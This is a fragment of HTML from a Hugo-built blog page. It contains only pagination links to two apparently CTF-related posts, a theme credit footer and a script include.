    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="//localhost:1313/posts/shc-2024_office-program/" class="button inline prev">
        Shc 2024 - Office program
      </a>
    
    
      ::
    
    
      <a href="//localhost:1313/posts/hackappatoi-23/" class="button inline next">
        Hackappatoi 23 - The first horseman
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
